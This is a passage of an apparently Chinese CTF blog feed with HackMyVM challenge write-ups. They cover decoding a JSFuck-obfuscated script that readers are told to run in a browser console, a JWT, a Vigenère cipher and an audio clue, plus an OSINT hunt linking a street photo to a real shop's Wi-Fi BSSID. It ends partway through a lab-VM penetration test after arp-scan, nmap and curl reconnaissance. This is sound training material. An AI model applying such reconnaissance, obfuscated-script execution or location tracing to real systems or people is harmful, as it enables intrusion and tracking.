]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())                                                                                                             
```

ËøôÊòØ‰∏ÄÁßçÂè´**JSFuck** ÁöÑJavaScript ÁºñÁ®ãÈ£éÊ†ºÔºåÊãøÂéªÊµèËßàÂô®ÊéßÂà∂Âè∞ÊâßË°å‰∏Ä‰∏ãÂ∞±ok‰∫Ü

ÊâìÂºÄÁΩëÈ°µabout:blank

![image-20250617112545976](https://7r1umphk.github.io/image/20250617112546424.webp)

```
HMV{jslovesxss}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20040.html</guid><pubDate>Fri, 27 Jun 2025 09:30:22 +0000</pubDate></item><item><title>Challenge 039</title><link>https://7r1UMPHK.github.io/post/Challenge%20039.html</link><description>![image-20250617111915057](https://7r1umphk.github.io/image/20250617111922673.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 039.zip 
Archive:  039.zip
  inflating: Challenge.txt           
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat Challenge.txt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat -A Challenge.txt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImZsYWciOiJEb05vdFN0b3JlU2Vuc2l0aXZlRGF0YUhlcmUiLCJpYXQiOjE2OTQ0MTk4ODMsImV4cCI6MTY5NDQyMzQ4M30.GZ29CTL0ggEb7ZNvZU7HjeXKWUdco8uLvEbHdpW0DODJQ74IvOPJsoxhL1o5aOq_GLEoOH4vU9fa9kn67zbJcQyr8kjAojX_oVUHyjH4q0UHVASPGgtZMAASUz84TAiX3AWnKFDsgPKumEas01R1CdOv3HVwfU5az5m45D8TPyBB7JxXQdLZyDIIbq4G8fGVUtj3F9oi96d2AzZrpYb8aGyOMsLeDA2wFXSkLQo--6BsY6zOAgsPNVkjrK5jWVXYuvS4U2SnsIp3Gq6vS6rPv4B4qvcBE5-RJ__ZcPg-eZJF-OJzQ9DlKpRE0wg3dzRJWcqTlp6q1Nbk9VQnHc_lUg                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ xxd Challenge.txt 
00000000: 6579 4a30 6558 4169 4f69 4a4b 5631 5169  eyJ0eXAiOiJKV1Qi
00000010: 4c43 4a68 6247 6369 4f69 4a53 557a 5578  LCJhbGciOiJSUzUx
00000020: 4d69 4a39 2e65 794a 7a64 5749 694f 6949  MiJ9.eyJzdWIiOiI
00000030: 784d 6a4d 304e 5459 334f 446b 7749 6977  xMjM0NTY3ODkwIiw
00000040: 6962 6d46 745a 5349 3649 6b70 7661 4734  ibmFtZSI6IkpvaG4
00000050: 6752 4739 6c49 6977 6959 5752 7461 5734  gRG9lIiwiYWRtaW4
00000060: 694f 6e52 7964 5755 7349 6d5a 7359 5763  iOnRydWUsImZsYWc
00000070: 694f 694a 4562 3035 7664 464e 3062 334a  iOiJEb05vdFN0b3J
00000080: 6c55 3256 7563 326c 3061 585a 6c52 4746  lU2Vuc2l0aXZlRGF
00000090: 3059 5568 6c63 6d55 694c 434a 7059 5851  0YUhlcmUiLCJpYXQ
000000a0: 694f 6a45 324f 5451 304d 546b 344f 444d  iOjE2OTQ0MTk4ODM
000000b0: 7349 6d56 3463 4349 364d 5459 354e 4451  sImV4cCI6MTY5NDQ
000000c0: 794d 7a51 344d 3330 2e47 5a32 3943 544c  yMzQ4M30.GZ29CTL
000000d0: 3067 6745 6237 5a4e 765a 5537 486a 6558  0ggEb7ZNvZU7HjeX
000000e0: 4b57 5564 636f 3875 4c76 4562 4864 7057  KWUdco8uLvEbHdpW
000000f0: 3044 4f44 4a51 3734 4976 4f50 4a73 6f78  0DODJQ74IvOPJsox
00000100: 684c 316f 3561 4f71 5f47 4c45 6f4f 4834  hL1o5aOq_GLEoOH4
00000110: 7655 3966 6139 6b6e 3637 7a62 4a63 5179  vU9fa9kn67zbJcQy
00000120: 7238 6b6a 416f 6a58 5f6f 5655 4879 6a48  r8kjAojX_oVUHyjH
00000130: 3471 3055 4856 4153 5047 6774 5a4d 4141  4q0UHVASPGgtZMAA
00000140: 5355 7a38 3454 4169 5833 4157 6e4b 4644  SUz84TAiX3AWnKFD
00000150: 7367 504b 756d 4561 7330 3152 3143 644f  sgPKumEas01R1CdO
00000160: 7633 4856 7766 5535 617a 356d 3435 4438  v3HVwfU5az5m45D8
00000170: 5450 7942 4237 4a78 5851 644c 5a79 4449  TPyBB7JxXQdLZyDI
00000180: 4962 7134 4738 6647 5655 746a 3346 396f  Ibq4G8fGVUtj3F9o
00000190: 6939 3664 3241 7a5a 7270 5962 3861 4779  i96d2AzZrpYb8aGy
000001a0: 4f4d 734c 6544 4132 7746 5853 6b4c 516f  OMsLeDA2wFXSkLQo
000001b0: 2d2d 3642 7359 367a 4f41 6773 504e 566b  --6BsY6zOAgsPNVk
000001c0: 6a72 4b35 6a57 5658 5975 7653 3455 3253  jrK5jWVXYuvS4U2S
000001d0: 6e73 4970 3347 7136 7653 3672 5076 3442  nsIp3Gq6vS6rPv4B
000001e0: 3471 7663 4245 352d 524a 5f5f 5a63 5067  4qvcBE5-RJ__ZcPg
000001f0: 2d65 5a4a 462d 4f4a 7a51 3944 6c4b 7052  -eZJF-OJzQ9DlKpR
00000200: 4530 7767 3364 7a52 4a57 6371 546c 7036  E0wg3dzRJWcqTlp6
00000210: 7131 4e62 6b39 5651 6e48 635f 6c55 67    q1Nbk9VQnHc_lUg
                                                                        
```

https://gchq.github.io/CyberChef/

![image-20250617112131776](https://7r1umphk.github.io/image/20250617112132131.webp)

```
HMV{DoNotStoreSensitiveDataHere}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20039.html</guid><pubDate>Fri, 27 Jun 2025 09:30:19 +0000</pubDate></item><item><title>Challenge 038</title><link>https://7r1UMPHK.github.io/post/Challenge%20038.html</link><description>Â§ç‰π†Â§çÁöÑÊúâÁÇπÊó†ËÅäÔºåÊâìÂá†‰∏™ChallengeÂêß

![image-20250616113539463](https://7r1umphk.github.io/image/20250616113547236.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 038.zip 
-rwxr-xr-x 1 kali kali 15093 Jun 15 23:36 038.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 038.zip 
Archive:  038.zip
  inflating: 038.mp3                 
                    
```

ÈùûÂ∏∏Âø´ÈÄüÁöÑÂîßÂîßÊ≠™Ê≠™ÔºåÂìàÂìàÂìà

ÊÖ¢ÊîæËØïËØï(audacity)ÔºåÊ≤°ÊúâÁöÑËá™Â∑±‰∏ã‰∏Ä‰∏™

https://www.audacityteam.org/

ÈáçÊîæÂà∞Â§ßÊ¶Ç0.2ÂÄçÂ∞±ÂèØ‰ª•Âê¨Âà∞ÂÆÉÂú®ËØ¥Â≠óÊØç(ÊïàÊûúÂô®&gt;Èü≥È´òÂíåÈÄüÂ∫¶&gt;ÂèòÈÄüÂπ∂ÂèòË∞É)

‰ΩÜÊòØÁ°ÆÂÆûÂê¨‰∏çÊ∏ÖÂÆÉÂú®ËØ¥‰ªÄ‰πàÔºåÂØºÂá∫Âéª

Âõ†‰∏∫ÊàëÁîµËÑë‰∏ãÊù•ËØ≠Èü≥ËΩ¨ÊñáÊú¨ÁöÑÊ®°ÂûãÔºåÊàëÂ∞±Áõ¥Êé•Áî®‰∫ÜÔºå‰Ω†‰ª¨ÂèØ‰ª•‰∏¢Áªôai‰πãÁ±ªÁöÑ

![image-20250616124822537](https://7r1umphk.github.io/image/20250616124822922.webp)

```
HMV{hacktheplanet}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20038.html</guid><pubDate>Fri, 27 Jun 2025 09:30:16 +0000</pubDate></item><item><title>Challenge 036</title><link>https://7r1UMPHK.github.io/post/Challenge%20036.html</link><description>![image-20250614100556180](https://7r1umphk.github.io/image/20250614100556493.webp)

ÊâæBSSIDÔºåÂÖà‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 036.zip                                   
-rwxr-xr-x 1 kali kali 1495216 Jun 13 22:06 036.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 036.zip 
Archive:  036.zip
 extracting: 036.png                 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ exiftool 036.png 
ExifTool Version Number         : 13.25
File Name                       : 036.png
Directory                       : .
File Size                       : 1495 kB
File Modification Date/Time     : 2023:08:24 12:20:50-04:00
File Access Date/Time           : 2025:06:13 22:06:26-04:00
File Inode Change Date/Time     : 2023:08:24 12:20:50-04:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1153
Image Height                    : 721
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Greenshot
Image Size                      : 1153x721
Megapixels                      : 0.831
                
```

ÁúãÁúãÂõæ

![036](https://7r1umphk.github.io/image/20250614100806952.webp)

googleÊâ´Ë°óÂêØÂä®

**ËØÜÂà´ÂÖ≥ÈîÆÊ†áÂøó**

suÂºÄÂ§¥ÁöÑÔºåÁÑ∂Âêé‰∫öÊ¥≤ËÇ§Ëâ≤ÔºåÁÑ∂Âêé

![image-20250614101747240](https://7r1umphk.github.io/image/20250614101747390.webp)

ËøôÁé©ÊÑèÂ∫îËØ•Âú®Â∫ßÁöÑÂêÑ‰ΩçÂ§ßÂ≠¶ÁîüÈÉΩËÆ§ËØÜÂêß

Èò≥ÂÖâÂú®Á∫øÂπøÂú∫

ÔºàÁªôÊàëÂπ≤ÁöÑÊÄÄÁñëÊòØÂú®china‰∫ÜÔºâ

‰ΩÜÊòØÔºåËøôÈáåÊúâÊó•Êñá

![image-20250614101905083](https://7r1umphk.github.io/image/20250614101905268.webp)

SunLiveÔºàÊó•ÊñáÔºö„Çµ„É≥„É™„ÉñÔºâ

Êâ´Ë°óÊâ´Ë°óÔºå‰∏ÄÊó∂Âçä‰ºöÊâæ‰∏çÂà∞ÔºågoogleÊêúÁ¥¢‰∏Ä‰∏ãÂêß

![image-20250614102419163](https://7r1umphk.github.io/image/20250614102419498.webp)

ÂìàÂìàÔºåÊúâÂâçËæàÁöÑwpÔºåÊàë‰ª¨ËøòÊòØ‰∏çÁúã‰∫ÜÔºå‰ΩÜÊòØ‰ªñÂÖ∂‰ªñÁöÑÂèØËÉΩÈÉΩÊòæÁ§∫‰∫Ü

![image-20250614103211358](https://7r1umphk.github.io/image/20250614103211803.webp)

Â§ßÊ¶Ç‰ΩçÁΩÆÔºö„Ç≥„Ç≥„Ç´„É©„Éï„Ç°„Ç§„É≥Ëñ¨Â±Ä„ÇÇ„Çä„Å§„Å≠Â∫ó

ÊâæÊâæÂêß

![image-20250614103315350](https://7r1umphk.github.io/image/20250614103316425.webp)

ÊâæÂà∞‰∫Ü

![image-20250614103343809](https://7r1umphk.github.io/image/20250614103344081.webp)

ËøôÈáåÔºåÁÑ∂ÂêéÊàë‰ª¨Ë¶ÅÂéªÊâæ**Wi-FiÊï∞ÊçÆÂ∫ì**ÊâíÊãâ‰∏Ä‰∏ã‰∫Ü

Áî® [wigle.net](https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fwigle.net%2F)

ÊêúÁ¥¢‰∏Ä‰∏ãÔºö 1 Chome-11-25 Moritsune, Kokuraminami Ward, Kitakyushu, Fukuoka 802-0972Êó•Êú¨
![image-20250614103934917](https://7r1umphk.github.io/image/20250614103935120.webp)

ÁÑ∂ÂêéÈúÄË¶ÅÊ≥®ÂÜå‰∏Ä‰∏ãÔºå‰∏çÁÑ∂Âï•ÈÉΩÁî®‰∏ç‰∫Ü

![image-20250614104212731](https://7r1umphk.github.io/image/20250614104212971.webp)

ÂïäËøôÔºåÊç¢‰∏™ÁΩëÁ´ô

ÊàëÂéªÔºåÊ≤°‰∏™ÂèØ‰ª•Áî®ÁöÑÔºåÁúãÁúãÂâçËæàÁöÑwpÂêß

https://sec-fortress.github.io/posts/HackMyVM/posts/036.html

```
HMV{00:3A:9A:7B:5F:40}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20036.html</guid><pubDate>Fri, 27 Jun 2025 09:30:13 +0000</pubDate></item><item><title>Challenge 014</title><link>https://7r1UMPHK.github.io/post/Challenge%20014.html</link><description># 1. ÂàùÊ≠•ÂàÜÊûê

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=014

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io//20250518140930918.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ÊåëÊàòÈ°µÈù¢ÈùûÂ∏∏Áõ¥Êé•Âú∞ÁªôÂá∫‰∫Ü‰ªªÂä°Ôºö

```
Find the flag in the domain http://momo.hackmyvm.eu
```

ËøôË°®Êòé Flag ÈöêËóèÂú®ÁõÆÊ†áÂüüÂêç `http://momo.hackmyvm.eu` ÁöÑÊüê‰∏™‰ΩçÁΩÆ„ÄÇÂØπ‰∫é Web Á±ªÂûãÁöÑÊåëÊàòÔºåÂ∏∏ËßÅÁöÑ Flag ÈöêËóèÂú∞ÁÇπÂåÖÊã¨Ôºö
*   HTML Ê∫ê‰ª£Á†ÅÊ≥®Èáä
*   ÁâπÂÆöÁöÑÈ°µÈù¢ÊàñÊñá‰ª∂Ë∑ØÂæÑ
*   HTTP ÂìçÂ∫îÂ§¥
*   `robots.txt` Êñá‰ª∂
*   `.htaccess` ÊàñÂÖ∂‰ªñÊúçÂä°Âô®ÈÖçÁΩÆÊñá‰ª∂ÔºàÂ¶ÇÊûúÂèØËÆøÈóÆÔºâ
*   ÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞ÁöÑÈöêËóèÁõÆÂΩïÊàñÊñá‰ª∂

## 2. ÂØªÊâæ Flag

Ê†πÊçÆ Web ÂÆâÂÖ®ÊµãËØïÁöÑÂ∏∏ËßÅÊ≠•È™§ÔºåÈ¶ñÂÖàÊ£ÄÊü• `robots.txt` Êñá‰ª∂ÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑËµ∑ÁÇπÔºåÂõ†‰∏∫ÂÆÉÈÄöÂ∏∏‰ºöÊåáÁ§∫ÊêúÁ¥¢ÂºïÊìéÂì™‰∫õË∑ØÂæÑ‰∏çÂ∫îËØ•Ë¢´Á¥¢ÂºïÔºåÊúâÊó∂‰ºöÊÑèÂ§ñÊ≥ÑÈú≤ÊïèÊÑü‰ø°ÊÅØÊàñÁ∫øÁ¥¢„ÄÇ

### 2.1 Ê£ÄÊü• robots.txt

‰ΩøÁî® `curl` ÂëΩ‰ª§ÔºàÊàñÁõ¥Êé•Âú®ÊµèËßàÂô®‰∏≠ËÆøÈóÆÔºâÊù•Ëé∑Âèñ `http://momo.hackmyvm.eu/robots.txt` ÁöÑÂÜÖÂÆπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://momo.hackmyvm.eu/robots.txt
HMV{robotized}
```

## 3. Ëé∑Âèñ Flag ÂÜÖÂÆπ

`curl` ÂëΩ‰ª§ÁöÑËæìÂá∫Áõ¥Êé•ËøîÂõû‰∫Ü Flag„ÄÇ`robots.txt` Êñá‰ª∂‰∏≠ÂåÖÂê´‰∫Ü `HMV{robotized}`„ÄÇ

## 4. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö

```
HMV{robotized}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20014.html</guid><pubDate>Fri, 27 Jun 2025 09:30:10 +0000</pubDate></item><item><title>Challenge 013</title><link>https://7r1UMPHK.github.io/post/Challenge%20013.html</link><description>**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=013

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518140039064.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÔºåÈ°µÈù¢‰∏äÊòæÁ§∫‰∫Ü‰∏ÄÊÆµË¢´ `&lt;pre&gt;` Ê†áÁ≠æÂåÖË£πÁöÑÊñáÊú¨Ôºö

```html
&lt;pre&gt; MXV{BNRNKWPCEUSEX} k:FLAG &lt;/pre&gt;
```

ËøôÊÆµÊñáÊú¨ÂåÖÂê´‰∏§ÈÉ®ÂàÜÔºö
1.  `MXV{BNRNKWPCEUSEX}`: ËøôÁúãËµ∑Êù•ÊòØ‰∏Ä‰∏™Âä†ÂØÜÂêéÁöÑ Flag Ê†ºÂºèÔºåÂÖ∂‰∏≠ `MXV` ÂèØËÉΩÊòØÂä†ÂØÜÊñáÊú¨ÁöÑÂâçÁºÄÔºå`BNRNKWPCEUSEX` ÊòØÂØÜÊñá„ÄÇ
2.  `k:FLAG`: ËøôÂº∫ÁÉàÊöóÁ§∫‰∫ÜÂä†ÂØÜÊâÄ‰ΩøÁî®ÁöÑÂØÜÈí• (key) ÊòØÂ≠óÁ¨¶‰∏≤ 'FLAG'„ÄÇ

ÁªìÂêàÂ∏∏ËßÅÁöÑ CTF È¢òÁõÆÁ±ªÂûãÔºåËøôÁßçÂΩ¢ÂºèÁöÑÂØÜÊñáÂíåÂØÜÈí•ÊèêÁ§∫ÈÄöÂ∏∏ÊåáÂêëÂè§ÂÖ∏ÂØÜÁ†ÅÔºåÂ¶ÇÂáØÊííÂØÜÁ†Å„ÄÅÁª¥ÂêâÂ∞º‰∫öÂØÜÁ†ÅÁ≠â„ÄÇËÄÉËôëÂà∞Êèê‰æõ‰∫ÜÂ§öÂ≠óÁ¨¶ÂØÜÈí• 'FLAG'ÔºåÁª¥ÂêâÂ∞º‰∫öÂØÜÁ†Å (Vigen√®re cipher) ÊòØÊúÄÊúâÂèØËÉΩÁöÑÂä†ÂØÜÊñπÂºè„ÄÇ

## 2. Ëß£ÂØÜËøáÁ®ã

‰∏∫‰∫ÜËé∑ÂèñÂéüÂßã FlagÔºåÊàë‰ª¨ÈúÄË¶Å‰ΩøÁî®ËØÜÂà´Âá∫ÁöÑÂØÜÈí•ÂØπÂØÜÊñáËøõË°åÁª¥ÂêâÂ∞º‰∫öËß£ÂØÜ„ÄÇ

### 2.1 ËØÜÂà´Âä†ÂØÜÁ±ªÂûãÂèäÂØÜÈí•

*   **Âä†ÂØÜÁ±ªÂûã**: Áª¥ÂêâÂ∞º‰∫öÂØÜÁ†Å (Vigen√®re cipher)„ÄÇ
*   **ÂØÜÊñá**: `BNRNKWPCEUSEX` (ÂèñËá™ `MXV{BNRNKWPCEUSEX}` ‰∏≠ÁöÑËä±Êã¨Âè∑ÈÉ®ÂàÜ)„ÄÇ
*   **ÂØÜÈí•**: `FLAG` (Ê†πÊçÆÈ°µÈù¢ÊèêÁ§∫ `k:FLAG`)„ÄÇ

### 2.2 ‰ΩøÁî® CyberChef ËøõË°åËß£ÂØÜ

CyberChef ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Êñπ‰æøÁöÑÂú®Á∫øÁºñËß£Á†ÅÂ∑•ÂÖ∑ÔºåÈùûÂ∏∏ÈÄÇÂêàÂ§ÑÁêÜÊ≠§Á±ªÂè§ÂÖ∏ÂØÜÁ†Å„ÄÇ

1.  ÊâìÂºÄ CyberChef„ÄÇ
2.  Â∞ÜÂØÜÊñá `BNRNKWPCEUSEX` Á≤òË¥¥Âà∞ 'Input' Ê°Ü‰∏≠„ÄÇ
    *   ÊàñËÄÖÔºåÂèØ‰ª•Â∞ÜÂÆåÊï¥ÁöÑÂ≠óÁ¨¶‰∏≤ `MXV{BNRNKWPCEUSEX}` ËæìÂÖ•ÔºåÁÑ∂ÂêéËßÇÂØüËß£ÂØÜÁªìÊûúÊòØÂê¶ÂåÖÂê´ÂèØËØÜÂà´ÁöÑ Flag Ê†ºÂºè„ÄÇÊ†πÊçÆÊÇ®ÁöÑÊà™ÂõæÔºåÊÇ®ËæìÂÖ•ÁöÑÊòØÂÆåÊï¥ÁöÑ `MXV{BNRNKWPCEUSEX}`„ÄÇ
3.  Âú® 'Operations' ÂàóË°®‰∏≠ÊêúÁ¥¢ 'Vigen√®re Decode' Âπ∂Â∞ÜÂÖ∂ÊãñÊãΩÂà∞ 'Recipe' Âå∫Âüü„ÄÇ
4.  Âú® 'Vigen√®re Decode' Êìç‰ΩúÁöÑ 'Key' Â≠óÊÆµ‰∏≠ËæìÂÖ•ÂØÜÈí• `FLAG`„ÄÇ

CyberChef ÁöÑÊìç‰ΩúÁïåÈù¢ÂíåËß£ÂØÜÁªìÊûúÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö

![1](https://7r1umphk.github.io/image/20250702100248579.webp)

‰ªé CyberChef ÁöÑËæìÂá∫ÂèØ‰ª•ÁúãÂà∞ÔºåÂΩìËæìÂÖ•‰∏∫ `MXV{BNRNKWPCEUSEX}` ‰∏îÂØÜÈí•‰∏∫ `FLAG` Êó∂ÔºåËß£ÂØÜÁªìÊûúÊòØ `HMV{VIGNERECYPHER}`„ÄÇ
ËøôÊÑèÂë≥ÁùÄÂéüÂßã Flag ÁöÑÂâçÁºÄÊòØ `HMV`ÔºåÂÜÖÂÆπÊòØ `VIGNERECYPHER`„ÄÇ

## 3. Ëé∑Âèñ Flag ÂÜÖÂÆπ

ÈÄöËøá CyberChef ‰ΩøÁî®Áª¥ÂêâÂ∞º‰∫öËß£ÂØÜÔºåÊàë‰ª¨ÊàêÂäüÂú∞Â∞ÜÂØÜÊñá `MXV{BNRNKWPCEUSEX}` ÈÖçÂêàÂØÜÈí• `FLAG` Ëß£ÂØÜ‰∏∫ÊòéÊñá„ÄÇ

## 4. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö

```
HMV{VIGNERECYPHER}
```

---sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20013.html</guid><pubDate>Fri, 27 Jun 2025 09:30:07 +0000</pubDate></item><item><title>eeeeeasy Èù∂Êú∫Ê∏óÈÄèÊµãËØïWriteup</title><link>https://7r1UMPHK.github.io/post/eeeeeasy%20-ba-ji-shen-tou-ce-shi-Writeup.html</link><description>Èù∂Êú∫ÂêçÂ≠ó: eeeeeasyÔºàÁæ§ÂèãÊú∫Âô®ÔºåÂèØËÉΩÂêéÈù¢‰ºöÂèëÂ∏ÉÂú®hackmyvmÔºâ

ÂìàÔºåÁúãËøôÂêçÂ≠óÔºåÊòØÊÉ≥ËØ¥ 'Â§™ÁÆÄÂçïÂï¶' ËøòÊòØ 'eeee...easy?' ‰∏çÁÆ°‰∫ÜÔºåÂºÄÂπ≤ÔºÅ

### 1. ‰ø°ÊÅØÊî∂ÈõÜ - ÊâæÂà∞‰Ω†‰∫ÜÔºÅ

ËÄÅËßÑÁü©ÔºåÂÖàÁî® `arp-scan` Âú®ÂÜÖÁΩëÈáåÊâ´‰∏ÄÂúàÔºåÁúãÁúãÁõÆÊ†áÂú®Âì™ÂÑø„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.213 08:00:27:70:f3:fd       (Unknown)  # &lt;--- ÁõÆÊ†áÂá∫Áé∞ÔºÅ
192.168.205.254 00:50:56:f5:17:d6       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 4 responded
```
ÁõÆÊ†áIPÊòØ `192.168.205.213`ÔºåÁ•≠Âá∫`nmap`Â§ßÊ≥ïÔºåÂÖàÊù•‰∏™ÂÖ®Á´ØÂè£Âø´ÈÄüÊâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- --min-rate 10000 192.168.205.213            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```
ÂºÄ‰∫Ü22 (SSH), 80 (HTTP), 443 (HTTPS) Á´ØÂè£„ÄÇÂÜçÊù•‰∏™ËØ¶ÁªÜÁÇπÁöÑÊúçÂä°ÁâàÊú¨Êé¢Êµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p22,80,443 -sV 192.168.205.213
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00029s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```
SSHÊòØOpenSSH 8.4p1ÔºåWebÊúçÂä°ÊòØApache 2.4.62 (Debian)„ÄÇÁúãÊù•Á™ÅÁ†¥Âè£ÂæàÂèØËÉΩÂú®Web‰∏ä„ÄÇ

### 2. WebÊ∏óÈÄè - ËóèÂæóÊå∫Ê∑±ÂïäÔºÅ

ÂÖàÁî®`curl`ÁúãÁúã80Âíå443Á´ØÂè£ÁöÑÈ¶ñÈ°µÊòØÂï•„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -v http://192.168.205.213:80
*   Trying 192.168.205.213:80...
* Connected to 192.168.205.213 (192.168.205.213) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.213
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 17 May 2025 08:40:10 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
